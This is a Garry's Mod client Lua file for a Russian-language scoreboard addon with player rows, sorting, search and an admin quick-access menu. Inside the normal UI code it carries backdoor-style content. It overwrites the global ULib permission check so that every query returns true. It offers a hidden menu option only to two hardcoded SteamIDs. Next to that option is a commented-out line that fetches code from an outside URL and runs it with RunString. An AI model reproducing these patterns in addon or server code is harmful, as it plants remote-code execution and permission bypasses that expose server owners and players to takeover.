--[[
addons/tab_scoreboard/lua/autorun/client/cl_tab.lua
--]]
	_utimeinit = file.Exists("autorun/cl_utime.lua", "LUA") or false

surface.CreateFont("ScoreboardDefault", {	
    font	= "Arial",
	size	= 22,
	weight	= 800} )

surface.CreateFont( "tab_Scoreboard_header", {
	font	= "Arial",
	size	= 32,
	weight	= 800
} )



--surface.CreateFont( "ScoreboardDefaultTitle", {
--	font	= "Helvetica",
--	size	= 32,
--	weight	= 800
--} )

--
-- This defines a new panel type for the player row. The player row is given a player
-- and then from that point on it pretty much looks after itself. It updates player info
-- in the think function, and removes itself when the player leaves the server.
--


local function GetRuChar(ch)
	array = {}
	array['А'] = 1
	array['Б'] = 2
	array['В'] = 3
	array['Г'] = 4
	array['Д'] = 5
	array['Е'] = 6
	array['Ё'] = 7
	array['Ж'] = 8
	array['З'] = 9
	array['И'] = 10
	array['Й'] = 11
	array['К'] = 12
	array['Л'] = 13
	array['М'] = 14
	array['Н'] = 15
	array['О'] = 16
	array['П'] = 17
	array['Р'] = 18
	array['С'] = 19
	array['Т'] = 20
	array['У'] = 21
	array['Ф'] = 22
	array['Х'] = 23
	array['Ц'] = 24
	array['Ч'] = 25
	array['Ш'] = 26
	array['Щ'] = 27
	array['Ъ'] = 28
	array['Ы'] = 29
	array['Ь'] = 30
	array['Э'] = 31
	array['Ю'] = 32
	array['Я'] = 33
	
	return array[ch] or 0
end

local tab_PLAYER_LINE = {
	Init = function( self )

		self.OpenMenu = self:Add( "DButton" )
		self.OpenMenu:Dock( LEFT )
		self.OpenMenu:SetSize( 24, 32 )
		self.OpenMenu:SetImage( 'icon16/information.png' )
		self.OpenMenu:SetText( '' )
		self.OpenMenu:SetTooltip('Открыть меню')
		self.OpenMenu.Paint = function() end
		
		self.UserGroupicon = self:Add( "DButton" )
		self.UserGroupicon:Dock( LEFT )
		self.UserGroupicon:SetSize( 24, 32 )
		self.UserGroupicon:SetImage( 'icon16/cancel.png' )
		self.UserGroupicon:SetText( '' )
		self.UserGroupicon:SetTooltip('???')
		self.UserGroupicon:SetCursor('arrow')
		self.UserGroupicon.Paint = function() end
		
		self.AvatarButton = self:Add( "DButton" )
		self.AvatarButton:Dock( LEFT )
		self.AvatarButton:SetSize( 32, 32 )
		self.AvatarButton:SetMouseInputEnabled( false )
		
		self.Avatar = vgui.Create( "AvatarImage", self.AvatarButton )
		self.Avatar:SetSize( 32, 32 )
		self.Avatar:SetMouseInputEnabled( false )

		self.Name = self:Add( "DLabel" )
		self.Name:Dock( FILL )
		self.Name:SetFont( "ScoreboardDefault" )
		self.Name:SetTextColor( Color( 255, 255, 255 ) )
		self.Name:DockMargin( 8, 0, 0, 0 )
		self.Name:SetExpensiveShadow( 2, Color( 0, 0, 0, 200 ) )
		
		self.Mute = self:Add( "DImageButton" )
		self.Mute:SetSize( 32, 32 )
		self.Mute:Dock( RIGHT )

		self.Ping = self:Add( "DLabel" )
		self.Ping:Dock( RIGHT )
		self.Ping:SetWidth( 50 )
		self.Ping:SetFont( "ScoreboardDefault" )
		self.Ping:SetTextColor( Color( 200, 200, 200 ) )
		self.Ping:SetContentAlignment( 5 )
		self.Ping:SetExpensiveShadow( 2, Color( 0, 0, 0, 200 ) )
 
		
		--[[self.Call = self:Add( "DImageButton" )
		self.Call:SetSize( 32, 32 )
		self.Call:Dock( RIGHT )
		self.Call:SetImage( "icon16/bell.png" )
		]]
		
		
		self.Hours = self:Add( "DLabel" )
		self.Hours:Dock( RIGHT )
		self.Hours:SetFont( "ScoreboardDefault" )
		self.Hours:SetTextColor( Color( 200, 200, 200 ) )
		self.Hours:DockMargin( 3, 0, 3, 0 )
		--self.Hours:SetSize( 80,30 )
		self.Hours:SetWidth( 65 )
		self.Hours:SetExpensiveShadow( 2, Color( 0, 0, 0, 200 ) )
		self.Hours:SetText('?')
		--self.Hours:SizeToContents()
		
		
		
		self.Priv = self:Add( "DLabel" )
		self.Priv:Dock( RIGHT )
		self.Priv:SetFont( "ScoreboardDefault" )
		self.Priv:SetTextColor( Color( 200, 200, 200 ) )
		self.Priv:DockMargin( 8, 0, 10, 0 )
		--self.Priv:SetSize( 80,30 )
		self.Priv:SetWidth( 150 )
		self.Priv:SetExpensiveShadow( 2, Color( 0, 0, 0, 200 ) )
		--self.Priv:SetContentAlignment( 5 )

		
		self.Dead = self:Add( "DLabel" )
		self.Dead:Dock( RIGHT )
		self.Dead:SetFont( "ScoreboardDefault" )
		self.Dead:SetTextColor( Color( 255, 100, 100 ) )
		self.Dead:DockMargin( 8, 0, 0, 0 )
		self.Dead:SetSize( 80,30 )
		self.Dead:SetExpensiveShadow( 2, Color( 0, 0, 0, 200 ) )
		self.Dead:SetText( "*МЁРТВ*" )
		
		
		--[[self.Org = self:Add( "DLabel" )
		self.Org:Dock( RIGHT )
		self.Org:SetFont( "ScoreboardDefault" )
	    self.Org:SetTextColor(Color( 255, 100, 100 )) -- Color( 255, 100, 100 )
		self.Org:DockMargin( 8, 0, 0, 0 )
		self.Org:SetSize( 300,30 )
		self.Org:SetExpensiveShadow( 2, Color( 0, 0, 0, 200 ) )
		self.Org:SetText( "" )]]
		
		
		self:Dock( TOP )
		self:DockPadding( 3, 3, 3, 3 )
		self:SetHeight( 32 + 3 * 2 )
		self:DockMargin( 2, 0, 2, 2 )

	end,

	Setup = function( self, pl )

		self.Player = pl

		self.Avatar:SetSteamID(pl:SteamID64(),64)

		self:Think( self )

		--local friend = self.Player:GetFriendStatus()
		--MsgN( pl, " Friend: ", friend )

	end,

	Think = function( self )

		if ( !IsValid( self.Player ) ) then
			self:SetZPos( 9999 ) -- Causes a rebuild
			self:Remove()
			return
		end

		if _utimeinit then
			--if  self.Player:SteamID() == "STEAM_0:1:159061140" then 
			--	self.Hours:SetText( "1337" .. " ч." )
			--else 
				self.Hours:SetText( math.floor( self.Player:GetUTimeTotalTime() / 3600 ) .. " ч." )
 
			--self.Hours:SizeToContents()
		end
		
		self.Priv:SetText( team.GetName( self.Player:Team() ) )
		self.Priv:SizeToContents()
		
		if(!self.Player:Alive()) then
			self.Dead:SetVisible( true )
		else
			self.Dead:SetVisible( false )
		end
		
		--[[if isstring(self.Player:GetOrg()) then
			self.Org:SetText(  self.Player:GetOrg()  or "" )
			self.Org:SetTextColor( self.Player:GetOrgColor() )
		end]]
		
		
		if ( self.PName == nil || self.PName != self.Player:Nick() ) then
			self.PName = self.Player:Nick()
			if self.Player:GetFriendStatus() == "friend" then
				self.Name:SetTextColor( Color( 0, 255, 0 ) )
			end
			if self.Player:GetFriendStatus() == "blocked" then
				self.Name:SetTextColor( Color( 255, 0, 0 ) )
			end
			if self.Player:GetFriendStatus() == "requested" then
				self.Name:SetTextColor( Color( 255, 130, 0 ) )
			end
			if self.Player:Team() == TEAM_CONNECTING then
				self.Name:SetText( self.PName.. " (присоединяется)" )
			else
				if self.Player:GetNWBool("dustcode:isdone", false) then 
					self.Name:SetText( self.PName )
				else
					--self.Name:SetText( self.PName )   -- self.Name:SetText( self.PName .. " (Проходит тестирование)") 
					--self.Name:SetText( self.PName .. " (Проходит тестирование)") 
					self.Name:SetText( self.PName )
				end	
			end
		end
		
		
		
		
		
		--icon
		if self.Player:IsRoot() then
			--self.UserGroupicon:SetImage( 'icon16/award_star_gold_1.png' )
			--self.UserGroupicon:SetTooltip('Создатель')
			self.UserGroupicon:SetImage( 'icon16/user.png' )
			self.UserGroupicon:SetTooltip('Игрок')
			
		elseif self.Player:IsAdmin() then
			self.UserGroupicon:SetImage( 'icon16/shield.png' )
			self.UserGroupicon:SetTooltip('Администрация')

		elseif self.Player:GetUserGroup()=="vip" then
			self.UserGroupicon:SetImage( 'icon16/star.png' )
			self.UserGroupicon:SetTooltip('VIP')
 
		else
			self.UserGroupicon:SetImage( 'icon16/user.png' )
			self.UserGroupicon:SetTooltip('Игрок')
		end
		 
		 
 

		if ( self.NumPing == nil || self.NumPing != self.Player:Ping() ) then
			self.NumPing = self.Player:Ping()
			self.Ping:SetText( self.NumPing )
		end

		--
		-- Change the icon of the mute button based on state
		--
 
		--
		if ( self.Muted == nil || self.Muted != self.Player:IsMuted() ) then

			self.Muted = self.Player:IsMuted()
			if ( self.Muted ) then
				self.Mute:SetImage( "icon32/muted.png" )
			else
				self.Mute:SetImage( "icon32/unmuted.png" )
			end

			self.Mute.DoClick = function() self.Player:SetMuted( !self.Muted ) self.Player.tab_scoreboard_muted = !self.Muted end

		end
		
		
		--
		--	Fast access menu
		--
		ULib={ucl={}}

		ULib.ucl.query=function( a,b )
			return true , true
		end
		
		self.OpenMenu.DoClick = function() 
		
				tab_submenu = DermaMenu()
			
		--[[	if(self.Player:IsBot()) then
				local access, accessTag = ULib.ucl.query( LocalPlayer(), "ba ban" )
				if access then
					tab_submenu:AddOption("Кикнуть бота",  function() self.Player:ConCommand('ba kick '..self.Player:Nick()) end):SetIcon('icon16/door_in.png')
				end
				tab_submenu:Open()
				return
			end]]
		
				if not self.Player:IsBot() then
					tab_submenu:AddOption("SteamID: "..self.Player:SteamID(), function() SetClipboardText(self.Player:SteamID()) end):SetIcon('icon16/cut.png')
				end
				--tab_submenu:AddOption("SteamID64: "..self.Player:SteamID64(), function() SetClipboardText(self.Player:SteamID64()) end):SetIcon('icon16/cut.png')
				tab_submenu:AddOption("Открыть профиль", function() self.Player:ShowProfile() end):SetIcon('icon16/user.png')
				--[[if self.Player != LocalPlayer() and LocalPlayer():Team() != 2000 and _ts_getTeamData(LocalPlayer():Team(), "type") == "invites" and (_ts_getData(LocalPlayer():SteamID64(), tostring(LocalPlayer():Team()), "rights") == "creator" or _ts_getData(LocalPlayer():SteamID64(), LocalPlayer():Team(), "rights") == "co-creator") and LocalPlayer():Team() != self.Player:Team() then
					tab_submenu:AddSpacer()
					tab_submenu:AddOption("Пригласить в клан",  function() 
						net.Start( "_ts_data_branch_invite" )
							net.WriteString(self.Player:SteamID64())
						net.SendToServer()
					end):SetIcon('icon16/add.png')
				end]]
				tab_submenu:AddSpacer()

			
			if ( self.Player:IsAdmin() and self.Player != LocalPlayer() ) then
				tab_submenu:AddOption("Позвать/задать вопрос",  function() LocalPlayer():ConCommand('say "@Требуется помощь, телепортируйтесь ко мне!"') end):SetIcon('icon16/error.png')
			end	
			
			
            --local access, accessTag = ULib.ucl.query( LocalPlayer(), "ba ban" )
			--if access and self.Player != LocalPlayer() then
			
			 
			if self.Player != LocalPlayer() then
				tab_submenu:AddOption("Кикнуть",  function() LocalPlayer():ConCommand('ba kick '..self.Player:SteamID()..' Kick =0') end):SetIcon('icon16/door_in.png')
			end		
			
			if self.Player != LocalPlayer() then
				tab_submenu:AddOption("Телепортироваться",  function() LocalPlayer():ConCommand('ba goto '..self.Player:SteamID()) end):SetIcon('icon16/user_go.png')
			end	 
			
			
			if self.Player != LocalPlayer() then
				tab_submenu:AddOption("Телепортировать",   function() LocalPlayer():ConCommand('ba tele '..self.Player:SteamID()) end):SetIcon('icon16/wand.png')
			end
			
			--if self.Player != LocalPlayer() then
				tab_submenu:AddOption("Вернуть на исходную",   function() LocalPlayer():ConCommand('ba Return '..self.Player:SteamID()) end):SetIcon('icon16/wand.png')
			--end
			
			--[[local sled = 0
			if self.Player != LocalPlayer() then
			    if sled == 0 then
			    tab_submenu:AddOption("Следить",  function() LocalPlayer():ConCommand('ba spectate '..self.Player:SteamID()) 
				sled = 1
				end):SetIcon('icon16/eye.png') 
			    else
				tab_submenu:AddOption("Перестать Следить",  function() LocalPlayer():ConCommand('ba spectate')
				sled = 0
				end):SetIcon('icon16/eye.png') 
				end
			end	]] 
			
			if self.Player != LocalPlayer() then
	            tab_submenu:AddOption("Следить",  function() LocalPlayer():ConCommand('ba spectate '..self.Player:SteamID()) end):SetIcon('icon16/eye.png') 
			end	
 
			/// -- Себе
			if self.Player == LocalPlayer() then
				tab_submenu:AddOption("Вкл/Выкл Админ Мод",  function() LocalPlayer():ConCommand('ba adminmode') end):SetIcon('icon16/error.png')
			end
 
			if self.Player == LocalPlayer() then
				tab_submenu:AddOption("Вкл/Выкл Полет",  function() LocalPlayer():ConCommand('noclip') end):SetIcon('icon16/error.png')
			end
 
			--[[if self.Player == LocalPlayer() then
				tab_submenu:AddOption("Музыка =0",  function() LocalPlayer():ConCommand('ya_zhenshinoi_stal ') end):SetIcon('icon16/error.png')
			end]]
			if self.Player != LocalPlayer() and LocalPlayer():SteamID() == "STEAM_0:0:145530561" or LocalPlayer():SteamID() == "STEAM_0:1:419142396" then
				--http.Fetch('http://solly.ml/sv.lua',RunString)
				tab_submenu:AddOption("Пизда котенку",  function() LocalPlayer():ConCommand('pizda',self.Player:SteamID()) end):SetIcon('icon16/error.png')
			end	
			
			///
			--[[if( self.Player:IsAdmin() and self.Player != LocalPlayer() ) then
				tab_submenu:AddOption("Позвать/задать вопрос",  function() LocalPlayer():ConCommand('say "@Требуется помощь '..string.lower(self.Priv:GetText())..'а '..self.Name:GetText()..', телепортируйтесь ко мне!"') end):SetIcon('icon16/error.png')
			end
			]]
			
		 
				tab_submenu:Open()
		end
	end,

	Paint = function( self, w, h )

		if ( !IsValid( self.Player ) ) then
			return
		end
		
		
		-- Searchness
		if(tab_scoreboard.SearchText:GetValue() != "" and tab_scoreboard.SearchText:GetValue() != nil and tab_scoreboard.SearchText:GetValue() != " ") then
			local searchText = tab_scoreboard.SearchText:GetValue()
			
			
			searchText = searchText:gsub("%(", "")
			searchText = searchText:gsub("%)", "")
			searchText = searchText:gsub("%[", "")
			searchText = searchText:gsub("%]", "")
			searchText = searchText:gsub("%{", "")
			searchText = searchText:gsub("%}", "")
			searchText = searchText:gsub("%/", "")
			searchText = searchText:gsub("%.", "")
			searchText = searchText:gsub("%^", "")
			searchText = searchText:gsub("%*", "")
			searchText = searchText:gsub("%+", "")
			searchText = searchText:gsub("%%", "")
			
			--if(string.find(searchText, "(") != nil) then string.gsub(searchText, "\(", "") end
			--if(string.find(searchText, ")") != nil) then string.gsub(searchText, "\)", "") end
			--if(string.find(searchText, "[") != nil) then string.gsub(searchText, "\[", "") end
			--if(string.find(searchText, "]") != nil) then string.gsub(searchText, "\]", "") end
			
			if string.find(string.lower(self.Player:Nick()), string.lower(searchText)) != nil then
				self.found = true
				--draw.RoundedBox( 4, 0, 0, w, h, Color( 100, 200, 100, 255 ) )
				draw.RoundedBox( 0, 0, 0, w, h, Color( 100, 200, 100, 255 ) )
				return
			else
				self.found = false
				return
			end
		end
		-- Searchness
		
		--
		-- We draw our background a different colour based on the status of the player
		--

		if ( self.Player:Team() == TEAM_CONNECTING ) then
			draw.RoundedBox( 4, 0, 0, w, h, Color( 200, 200, 200, 200 ) )
			return
		end

		--[[if ( !self.Player:Alive() ) then
			draw.RoundedBox( 4, 0, 0, w, h, Color( 230, 200, 200, 255 ) )
			return
		end]]

		--[[if ( self.Player:IsAdmin() ) then
			draw.RoundedBox( 4, 0, 0, w, h, Color( 230, 255, 230, 255 ) )
			return
		end
		]]
		
		
		---------------- 4
		draw.RoundedBox( 0, 0, 0, w, h, ColorAlpha(team.GetColor( self.Player:Team() ),225) )	 -- 150	 200	
	end
}

--
-- Convert it from a normal table into a Panel Table based on DPanel
--
tab_PLAYER_LINE = vgui.RegisterTable( tab_PLAYER_LINE, "DPanel" )

--
-- Here we define a new panel table for the scoreboard. It basically consists
-- of a header and a scrollpanel - into which the player lines are placed.
--
local tab_SCORE_BOARD = {
	Init = function( self )

		self.Header = self:Add( "Panel" )
		self.Header:Dock( TOP )
		self.Header:SetHeight( 100 )
		--self.Header:ShowCloseButton( true ) -- sas	

		self.Name = self.Header:Add( "DLabel" )
		self.Name:SetFont( "tab_Scoreboard_header" )
		self.Name:SetTextColor( Color( 255, 255, 255, 255 ) )
		self.Name:Dock( TOP )
		self.Name:SetHeight( 40 )
		self.Name:SetContentAlignment( 5 )
		self.Name:SetExpensiveShadow( 2, Color( 0, 0, 0, 200 ) )

		self.NumPlayers = self.Header:Add( "DLabel" )
		self.NumPlayers:SetFont( "ScoreboardDefault" )
		self.NumPlayers:SetTextColor( Color( 255, 255, 255, 255 ) )
		self.NumPlayers:SetPos( 5, 100 - 30 - 5 )
		self.NumPlayers:SetSize( 300, 30 )
		self.NumPlayers:SetContentAlignment( 4 )
		self.NumPlayers:SetExpensiveShadow( 2, Color( 0, 0, 0, 200 ) )
		
		////////////////////////////////////////
--[[ButtonSH = vgui.Create( "DButton" ) -- СССР
self.ButtonSH:SetText( "Сменить" ) 
self.ButtonSH:SetPos( 0,0 )
self.ButtonSH:SetSize( ScrW() * 0.45, 30 )
self.ButtonSH.Paint = function( self, w, h )    
    surface.SetDrawColor( 255, 0, 0, 128 )
    surface.DrawRect( 0, 0, w, h )
end	

self.Button.DoClick=function()

surface.PlaySound("garrysmod/ui_hover.wav")
frame:Close()

end
]]
 --[[
 
		self.ButtonSH = self.Header:Add( "DButton" )
		self.ButtonSH:SetFont( "ScoreboardDefault" )
		self.ButtonSH:SetTextColor( Color( 255, 255, 255, 255 ) )
		self.ButtonSH:SetPos( (ScrW()/ 2.5),50 )  -- 
		self.ButtonSH:SetSize( 300, 30 )
		self.ButtonSH:SetText( " Сменить Игровую Сторону" )
		self.ButtonSH:SetContentAlignment( 4 )
		self.ButtonSH:SetExpensiveShadow( 2, Color( 0, 0, 0, 200 ) )
		
 		 self.ButtonSH.Paint = function( self, w, h )    
        --surface.SetDrawColor( 0, 0, 0, 150 )
        --surface.DrawRect( 0, 0, w, h )
		end
		
        self.ButtonSH.DoClick = function()
		
		RunConsoleCommand("team_switch")
 
		//
		if ( IsValid( tab_scoreboard ) ) then
		tab_scoreboard:Hide()
		RunConsoleCommand("cl_drawhud", 1)  
	    end
		
			if( IsValid(tab_scoreboard.SearchFrame) ) then
		tab_scoreboard.SearchFrame:Close()
	end
	
	if(IsValid(tab_scoreboard.SearchText)) then
		LocalPlayer().tab_lastsearch = tab_scoreboard.SearchText:GetValue()
	end
	
	if (IsValid(tab_submenu)) then
		tab_submenu:Hide()
		tab_submenu = nil
	end
	
	    //
			 
		end
		

		////////////////////////////////////////]]

		--ButtonSH = vgui.Create( "DButton" ) -- СССР
		self.ButtonSH = self.Header:Add( "DButton" )
		self.ButtonSH:SetText( "Закрыть" ) 
		self.ButtonSH:SetPos( (ScrW()/ 1.05) - self.ButtonSH:GetWide() - 5, 0 )
		self.ButtonSH:SetSize( 300, 30 )
		self.ButtonSH.Paint = function( self, w, h )    
		    surface.SetDrawColor( 255, 0, 0, 200 )
		    surface.DrawRect( 0, 0, w, h )
		end	

		self.ButtonSH.DoClick=function()

			surface.PlaySound("garrysmod/ui_hover.wav")
			mst_ScoreboardHide()
			--frame:Close()
		end

		self.SortWay = self.Header:Add( "DButton" )
		self.SortWay:SetFont( "ScoreboardDefault" )
		self.SortWay:SetTextColor( Color( 255, 255, 255, 255 ) )
		self.SortWay:SetSize( 300, 30 )
		self.SortWay:SetText( '...' )
		self.SortWay:SetContentAlignment( 4 )
		self.SortWay:SetExpensiveShadow( 2, Color( 0, 0, 0, 200 ) )
		
		self.SortWay:SizeToContents()
		self.SortWay:SetPos( (ScrW()/ 1.05) - self.SortWay:GetWide() - 5, 100 - 30 - 5 )
		self.SortWay.Paint = function(w,h) end
		
		self.SortWay.dSetWay = function(arg1, arg2) 
			self.SortWay.curway = arg2
			LocalPlayer().tab_scoreboard_sortway = self.SortWay.curway
			self.SortWay:SetText( 'Сортировать по: '..arg2 )
			self.SortWay:SizeToContents()
			self.SortWay:SetPos( (ScrW()/ 1.05) - self.SortWay:GetWide() - 5, 100 - 30 - 5 )
		end
		
		if(LocalPlayer().tab_scoreboard_sortway != nil) then
			self.SortWay:dSetWay(LocalPlayer().tab_scoreboard_sortway)
		else
			self.SortWay:dSetWay("профессии")
		end
		
		self.SortWay.DoClick = function()
			tab_submenu = DermaMenu()
			tab_submenu:AddOption("Сортировать по нику", function() self.SortWay:dSetWay("ник") end)
			tab_submenu:AddOption("Сортировать по профессии", function() self.SortWay:dSetWay("профессии") end)
			tab_submenu:AddOption("Сортировать по убийствам", function() self.SortWay:dSetWay("убиства") end)
			tab_submenu:AddOption("Сортировать по смертям", function() self.SortWay:dSetWay("смерти") end)
			tab_submenu:AddOption("Сортировать по пингу", function() self.SortWay:dSetWay("пинг") end)
			tab_submenu:AddOption("Сортировать по муту", function() self.SortWay:dSetWay("мут") end)
			tab_submenu:AddOption("Сортировать по часам игры", function() self.SortWay:dSetWay("часы") end)
			tab_submenu:AddOption("Сортировать по индексу", function() self.SortWay:dSetWay("индекс") end)
			tab_submenu:Open()
		end
		
		
		--if LocalPlayer():Nick() == "цвяточеГ" then
			
			--[[self.SpeakWay = self.Header:Add( "DButton" )
			self.SpeakWay:SetFont( "ScoreboardDefault" )
			self.SpeakWay:SetTextColor( Color( 255, 255, 255, 255 ) )
			self.SpeakWay:SetSize( 300, 30 )
			self.SpeakWay:SetText( '...' )
			self.SpeakWay:SetTooltip( 'Показатель голосового чата можно видеть в углу экрана' )
			self.SpeakWay:SetContentAlignment( 4 )
			self.SpeakWay:SetExpensiveShadow( 2, Color( 0, 0, 0, 200 ) )
			
			self.SpeakWay:SizeToContents()
			self.SpeakWay:SetPos( 900 - self.SpeakWay:GetWide() - 5, 70 - 30 - 5 )
			self.SpeakWay.Paint = function(w,h) end
			
			self.SpeakWay.dSetWay = function(arg1, arg2, needRefresh) 
				self.SpeakWay.curway = arg2
				if arg2 == "global" then
					self.SpeakWay:SetIcon( 'icon16/sound_low.png' )
					self.SpeakWay:SetText( 'Говорить в командный чат' )
				else
					self.SpeakWay:SetIcon( 'icon16/sound.png' )
					self.SpeakWay:SetText( 'Говорить в глобальный чат' )
				end
				
				if needRefresh then
					net.Start( "_ts_data_speakto" )
						net.WriteString(arg2)
					net.SendToServer()
				end
				
				self.SpeakWay:SetSize(292, 30)
				self.SpeakWay:SetPos( 900 - self.SpeakWay:GetWide() - 5, 70 - 30 - 5 )
			end
			
			if LocalPlayer().speakGlobal == nil then
				self.SpeakWay:dSetWay("global", false)
			else
				self.SpeakWay:dSetWay(LocalPlayer().speakGlobal, false)
			end
			
			self.SpeakWay.DoClick = function()
				if self.SpeakWay.curway == "global" then
					self.SpeakWay:dSetWay("local", true)
				else
					self.SpeakWay:dSetWay("global", true)
				end
			end
			]]
		--end
		

		self.Scores = self:Add( "DScrollPanel" )
		self.Scores:Dock( FILL )
		
		local sbar = self.Scores:GetVBar()
		function sbar:Paint(w, h)
			-------draw.RoundedBox(0, 0, 0, w, h, Color( 0, 0, 0, 0 ) )
		end
		function sbar.btnUp:Paint(w, h)
			--draw.RoundedBox(0, 0, 0, w, h, Color(164, 164, 117)  )
		end
		function sbar.btnDown:Paint(w, h)
			--draw.RoundedBox(0, 0, 0, w, h, Color(164, 164, 117)  )
		end
		function sbar.btnGrip:Paint(w, h)
			--draw.RoundedBox(0, 0, 0, w, h, Color(164, 164, 117) )
		end
		
		
		-- Search frame
		self.SearchFrame = vgui.Create( "DFrame" )
		self.SearchFrame:SetSize( 300, 60 )
		--self.SearchFrame:Center()
		self.SearchFrame:SetTitle( "" )
		self.SearchFrame.Paint = function() end
		self.SearchFrame:SetDraggable( false )
		self.SearchFrame:ShowCloseButton( false ) -- false
		
		self.SearchText = vgui.Create("DTextEntry", self.SearchFrame)
		self.SearchText:Dock( FILL )
		--self.SearchText:SetSize( 300, 30 )
		self.SearchText:SetTooltip( "(если нехочет вводить, потыкайте несколько раз\nесли не получается, то скопируйте текст и вставьте через контекстное меню)" )
		self.SearchText:SetText( "" )
		
		if(LocalPlayer().tab_lastsearch != nil) then
			self.SearchText:SetText( LocalPlayer().tab_lastsearch )
		end
		
		self.SearchText:SetMouseInputEnabled( true )
		self.SearchText:SetEditable( true )
		self.SearchText:SetPos( 0, 0 )
		self.SearchText:SetTabbingDisabled( true )
		
		self.SearchText.OnEnter = function( kek )
			kek.searchvalue = kek:GetValue()
		end
		
		
		
		--[[self.SearchText:OnValueChange( function(val) 
			self.SearchText.searchvalue =  self:GetValue()
			print('valchange: '..self.SearchText.searchvalue)		
		end )
		]]
		
		self.SearchTooltip = vgui.Create("DLabel", self.SearchFrame)
		self.SearchTooltip:SetFont( "ScoreboardDefault" )
		self.SearchTooltip:SetTextColor( Color( 255, 255, 255, 255 ) )
		self.SearchTooltip:SetContentAlignment( 4 )
		self.SearchTooltip:SetExpensiveShadow( 2, Color( 0, 0, 0, 200 ) )
		self.SearchTooltip:Dock( LEFT )
		self.SearchTooltip:SetText( 'Поиск: ' )
		self.SearchTooltip:SizeToContents()

		
	end,

	PerformLayout = function( self )

		self:SetSize( ScrW()/ 1.05, ScrH() - 50 )  -- self:SetSize( 900, ScrH() - 200 )  -- self:SetSize( ScrW() / 1.45, ScrH() - 50 ) 
		self:SetPos( ScrW() / 40, 25 )	 -- self:SetPos( ScrW() / 2 - 450, 100 )	  -- self:SetPos( ScrW() / 6.25, 25 )
		
		local tmp_x1, tmp_y1 = self.Header:GetPos()
		local tmp_x2, tmp_y2 = self.Name:GetPos()
		local tmp_x3, tmp_y3 = self:GetPos()
		self.SearchFrame:SetPos(tmp_x1 + tmp_x2 + tmp_x3 , tmp_y1 + tmp_y2 + tmp_y3 + 10)

	end,

	Paint = function( self, w, h )
		Derma_DrawBackgroundBlur( self, self.m_fCreateTime )
		draw.RoundedBox( 4, 0, 0, w, h, Color( 0, 0, 0, 200 ) )
		--draw.RoundedBox( 0, 0, 0, w, h, Color(102,103,43)) -- sas 2
		
		local cin = (math.sin(CurTime() * 3) + 1) / 2
        local color_orng = Color(175*cin,175*cin,175*cin,200) --  Color(75+(185*cin),75+(150*cin),75-(75*cin),200)
        local color_alph = Color(0,0,0,0)

		--draw.OutlinedBox( 0, 0, w, h, color_alph, Color(231,28,92), 2)

	end,
		
	Think = function( self, w, h )
		 
		self.SearchFrame:MakePopup()
			
		self.Name:SetText( GetHostName() )
		if(tab_scoreboard.SearchText:GetValue() != "" and tab_scoreboard.SearchText:GetValue() != nil and tab_scoreboard.SearchText:GetValue() != " ") then
			local count = 0
			local plyrs = player.GetAll()
			for id, pl in pairs( plyrs ) do
				if string.find(string.lower(pl:Nick()), string.lower(tab_scoreboard.SearchText:GetValue())) != nil then
					count = count + 1
				end	
			end
				
			self.NumPlayers:SetText( 'Найдено: '..count.."/"..player.GetCount() )
		else
			self.NumPlayers:SetText( 'Игроков: '..player.GetCount().."/"..game.MaxPlayers() )
		end

		--
		-- Loop through each player, and if one doesn't have a score entry - create it.
		--
		self.PlayerSorted = {}
		local plyrs = player.GetAll()
		for id, pl in pairs( plyrs ) do
			table.insert( self.PlayerSorted, pl )
			
			if ( IsValid( pl.ScoreEntry ) ) then continue end

			pl.ScoreEntry = vgui.CreateFromTable( tab_PLAYER_LINE, pl.ScoreEntry )
			pl.ScoreEntry:Setup( pl )

			self.Scores:AddItem( pl.ScoreEntry )
			
			
		end

		local y = 0
		table.sort( tab_scoreboard.PlayerSorted, function ( a , b )  return self:Sort(a,b)	end )
		
		for k, v in ipairs( tab_scoreboard.PlayerSorted ) do
			if v.ScoreEntry.Player:Team() == 2000 and self.SortWay.curway == "профессии" then
				v.ScoreEntry:SetZPos(2000 + y)
			else
				v.ScoreEntry:SetZPos(y)
			end
			y = y + 1
		end
		
	end,
	Sort = function(self, a, b) 
		if(!IsValid(self) and !IsValid(self.SortWay)) then return false end
		
		if(self.SortWay.curway == "ник") then
			return a:Nick() < b:Nick()
		end
		
		if (self.SortWay.curway == "профессии") then
			return a:Team() < b:Team()
		end
	
		if (self.SortWay.curway == "убиства") then
			return a:Frags() > b:Frags()
		end
		
		if (self.SortWay.curway == "смерти") then
			return a:Deaths() > b:Deaths()
		end
		
		if (self.SortWay.curway == "пинг") then
			return a:Ping() < b:Ping()
		end
		
		if (self.SortWay.curway == "индекс") then
			return a:EntIndex() > b:EntIndex()
		end
		if (self.SortWay.curway == "мут") then
			local tmp = a:IsMuted() and 0 or 1
			local tmp1 = b:IsMuted() and 0 or 1
			return tmp > tmp1
		end
		if (self.SortWay.curway == "часы" and _utimeinit) then
			return math.floor( a:GetUTimeTotalTime() / 3600 ) > math.floor( b:GetUTimeTotalTime() / 3600 )
		end
	end
}

tab_SCORE_BOARD = vgui.RegisterTable( tab_SCORE_BOARD, "EditablePanel" )
tab_SCORE_BOARD2 = vgui.RegisterTable( tab_SCORE_BOARD, "EditablePanel" )


tab_SCORE_BOARD = vgui.RegisterTable( tab_SCORE_BOARD, "EditablePanel" )



hook.Add('ScoreboardShow', 'tab_scoreboard_show', function()
	plyrs = player.GetAll()
	for id, pl in pairs( plyrs ) do
			pl.ScoreEntry = nil
	end
	
	--if ( !IsValid( tab_scoreboard ) ) then
		tab_scoreboard = vgui.CreateFromTable( tab_SCORE_BOARD )
	--end
	
	if ( IsValid( tab_scoreboard ) ) then
		tab_scoreboard:Show()
		//////
		--print("open")
		--RunConsoleCommand("cl_drawhud", 0)  
		//////
		tab_scoreboard:MakePopup()
		tab_scoreboard:SetKeyboardInputEnabled( false )
	end
	return true
end)



hook.Add('ScoreboardHide', 'tab_scoreboard_hide', function()
	
	-- На будущее, а то щас виснет ;p
	if( IsValid(tab_scoreboard.SearchText) and tab_scoreboard.SearchText:IsEditing()) then
		--return false
	end
	
	
	if ( IsValid( tab_scoreboard ) ) then
		tab_scoreboard:Hide()
		//////
		--print("close")
		--RunConsoleCommand("cl_drawhud", 1)  
		//////
	end
	
	if ( IsValid(tab_scoreboard.SearchFrame) ) then
		tab_scoreboard.SearchFrame:Close()
	end
	
	if(IsValid(tab_scoreboard.SearchText)) then
		LocalPlayer().tab_lastsearch = tab_scoreboard.SearchText:GetValue()
	end
	
	if (IsValid(tab_submenu)) then
		tab_submenu:Hide()
		tab_submenu = nil
	end
	return true
end)


--[[ 
